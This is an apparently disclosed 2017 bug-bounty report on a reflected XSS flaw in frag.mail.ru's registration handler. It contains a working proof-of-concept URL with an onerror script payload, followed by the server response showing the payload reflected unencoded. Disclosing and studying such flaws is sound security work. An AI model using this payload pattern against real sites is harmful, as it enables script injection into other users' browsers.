@@ -1,0 +1,81 @@
+ReportLink:https://hackerone.com/reports/214642
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/twicedi
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:10.05.2017 14:56:05
+
+Summary:
+
+##Domain, site, application##
+
+The "frag.mail.ru" is affected by a reflected XSS vulnerability on the "/user/register/" handler.
+
+
+##Testing environment##
+
+The exploitation of the issue has been tested on the latest version (at the time of writing) of Firefox: 52.0.1 (both 32 and 64 bit) on Sierra and Windows 7 OS.
+
+##Steps to reproduce##
+
+To exploit the issue the victim has to visit the following URL: https://frag.mail.ru/user/register/!%22--!%3E%3CImage%0CSrcset%3DK%0COnerror%3Dconfirm%601%60%0C
+
+##Actual results##
+
+Since the input is reflected inside the response and no output encoding is done the payload injected is executed inside the context of the webpage.
+
+##Expected results and recommendations##
+
+To protect the application against cross-site scripting attacks, assume that all input is malicious. Constrain and validate all input. Encode all output that could, potentially, include HTML characters.
+
+##PoC, exploit code, screenshots, video, references, additional resources##
+
+By visiting the following URL: https://frag.mail.ru/user/register/!%22--!%3E%3CImage%0CSrcset%3DK%0COnerror%3Dconfirm%601%60%0C on Firefox, the JavaScript code injected inside the payload is correclty executed, as showed in the following snippet of response and as it is possible to see in the screenshot attached.
+
+Response:
+
+```
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 19 Mar 2017 11:51:36 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Expires: Sun, 19 Nov 1978 05:00:00 GMT
+Last-Modified: Sun, 19 Mar 2017 11:51:28 GMT
+Cache-Control: store, no-cache, must-revalidate
+Cache-Control: post-check=0, pre-check=0
+X-Filter-Time: 1.088 ms
+X-Res-Usage-Time: U=52000,S=8000,R=88202
+X-Frame-Options: SAMEORIGIN
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000
+Content-Length: 23218
+
+<!DOCTYPE HTML>
+
+[REDACTED...]
+
+
+	<div id="block_content" class="user_register_!"--!><ImageSrcset=KOnerror=confirm`1`">
+		<div id="content">
+			<div id="block_center">
+
+													<div class="block_text">
+						<div class="text_content_block">
+
+															<div class="bg_title">
+									<div class="title_userregister!"--!><ImageSrcset=KOnerror=confirm`1`">
+
+									</div>
+								</div>
+            
+
+[REDACTED...]
+```
+
+I'm available for further clarification,
+
+Best,
+Davide
